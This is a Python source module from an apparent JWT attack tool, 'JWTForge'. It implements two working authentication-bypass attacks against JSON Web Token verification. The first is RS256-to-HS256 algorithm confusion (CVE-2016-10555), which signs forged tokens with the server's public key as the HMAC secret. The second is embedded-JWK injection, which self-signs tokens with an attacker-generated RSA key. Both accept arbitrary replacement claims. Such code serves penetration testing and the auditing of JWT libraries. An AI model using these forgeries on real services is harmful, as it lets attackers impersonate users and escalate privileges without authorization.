"""
JWTForge - RS256 → HS256 Key Confusion Attack
CVE-2016-10555 / Algorithm Confusion

When a server accepts both RS256 (asymmetric) and HS256 (symmetric) tokens,
an attacker can:
  1. Obtain the server's RSA public key
  2. Change the algorithm header from RS256 to HS256
  3. Sign the token using the RSA public key as the HMAC secret

The server, expecting RS256, uses its public key to *verify* the HMAC signature —
which works, because we signed with that same public key.

References:
  - https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
  - CVE-2016-10555
"""

import hmac
import hashlib
import json
import re
from typing import Dict, Any, Optional

from ..core.parser import JWTParser, b64url_encode


SUPPORTED_CONFUSION_ALGOS = {
    'HS256': hashlib.sha256,
    'HS384': hashlib.sha384,
    'HS512': hashlib.sha512,
}


def _normalize_pem(pem: str) -> bytes:
    """Ensure PEM key is properly formatted and return as bytes."""
    pem = pem.strip()
    if not pem.startswith('-----'):
        raise ValueError("Input does not look like a PEM key. Ensure it includes -----BEGIN ... KEY----- headers.")
    return pem.encode('utf-8')


def attack_key_confusion(
    token: str,
    public_key_pem: str,
    target_alg: str = 'HS256',
    custom_payload: Dict = None
) -> Dict[str, Any]:
    """
    RS256 → HS256 key confusion attack.

    Args:
        token: Original RS256 JWT
        public_key_pem: RSA public key in PEM format
        target_alg: Target HMAC algorithm (HS256/HS384/HS512)
        custom_payload: Optional modified payload claims

    Returns:
        Result dict with forged token
    """
    parser = JWTParser(token)
    original_alg = parser.get_algorithm()

    if target_alg not in SUPPORTED_CONFUSION_ALGOS:
        return {
            'attack': 'key_confusion',
            'status': 'error',
            'detail': f'Unsupported target algorithm: {target_alg}',
        }

    # Get the secret (public key bytes)
    try:
        secret = _normalize_pem(public_key_pem)
    except ValueError as e:
        return {
            'attack': 'key_confusion',
            'status': 'error',
            'detail': str(e),
        }

    payload = custom_payload if custom_payload is not None else parser.payload

    # Build new header
    new_header = dict(parser.header)
    new_header['alg'] = target_alg
    # Remove 'kid' if present as it may interfere
    # (keep it commented — some servers need kid)

    # Build signing input
    h = b64url_encode(json.dumps(new_header, separators=(',', ':')).encode())
    p = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    signing_input = f"{h}.{p}".encode()

    # Sign with HMAC using public key as secret
    digest_fn = SUPPORTED_CONFUSION_ALGOS[target_alg]
    sig = hmac.new(secret, signing_input, digest_fn).digest()
    sig_b64 = b64url_encode(sig)

    forged = f"{h}.{p}.{sig_b64}"

    return {
        'attack': 'key_confusion',
        'status': 'success',
        'original_alg': original_alg,
        'forged_alg': target_alg,
        'token': forged,
        'note': f'Signed with RSA public key as HMAC-{target_alg[2:]} secret',
        'detail': f'{original_alg} → {target_alg} using public key as HMAC secret',
    }


def attack_key_confusion_all_algs(
    token: str,
    public_key_pem: str,
    custom_payload: Dict = None
) -> list:
    """Try all HS variants for key confusion."""
    results = []
    for alg in SUPPORTED_CONFUSION_ALGOS:
        result = attack_key_confusion(token, public_key_pem, alg, custom_payload)
        results.append(result)
    return results


def extract_pubkey_from_jwt(token: str) -> Optional[str]:
    """
    Attempt to extract embedded JWK public key from JWT header (jwk claim).
    Some tokens embed the public key directly — attacker can substitute their own.
    """
    parser = JWTParser(token)
    jwk = parser.header.get('jwk')
    if jwk:
        return json.dumps(jwk, indent=2)
    return None


def attack_embedded_jwk(token: str) -> Dict[str, Any]:
    """
    Embedded JWK attack — create a new RSA key pair, embed public key in header,
    sign with our private key.

    The server uses the embedded key to verify — and we control that key.
    """
    try:
        from cryptography.hazmat.primitives.asymmetric import rsa, padding
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.backends import default_backend
        import base64

        # Generate new RSA key pair
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        public_key = private_key.public_key()
        pub_numbers = public_key.public_key().public_numbers() if hasattr(public_key, 'public_key') else public_key.public_numbers()

        def int_to_b64(n):
            byte_length = (n.bit_length() + 7) // 8
            return base64.urlsafe_b64encode(n.to_bytes(byte_length, 'big')).rstrip(b'=').decode()

        jwk_pub = {
            "kty": "RSA",
            "n": int_to_b64(pub_numbers.n),
            "e": int_to_b64(pub_numbers.e),
        }

        parser = JWTParser(token)
        new_header = dict(parser.header)
        new_header['alg'] = 'RS256'
        new_header['jwk'] = jwk_pub
        new_header.pop('kid', None)
        new_header.pop('jku', None)

        h = b64url_encode(json.dumps(new_header, separators=(',', ':')).encode())
        p = b64url_encode(json.dumps(parser.payload, separators=(',', ':')).encode())
        signing_input = f"{h}.{p}".encode()

        sig = private_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
        sig_b64 = b64url_encode(sig)
        forged = f"{h}.{p}.{sig_b64}"

        return {
            'attack': 'embedded_jwk',
            'status': 'success',
            'token': forged,
            'note': 'Embedded attacker-controlled JWK in header, signed with our private key',
            'detail': 'Embedded JWK injection (self-signed)',
        }

    except Exception as e:
        return {
            'attack': 'embedded_jwk',
            'status': 'error',
            'detail': str(e),
        }
